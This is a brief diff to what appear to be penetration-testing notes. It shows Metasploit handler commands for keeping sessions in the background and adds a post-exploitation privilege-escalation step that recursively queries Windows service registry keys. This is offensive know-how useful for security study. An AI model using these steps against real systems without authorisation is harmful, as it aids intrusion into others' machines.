@@ -13,3 +13,8 @@ msf> set ExitOnSession false
 msf>exploit -j
 
 The -j option is to keep all the connected session in the background.
+----------------------------------------------------------------------------
+Post - privs escalation
+
+reg query HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ /s
+
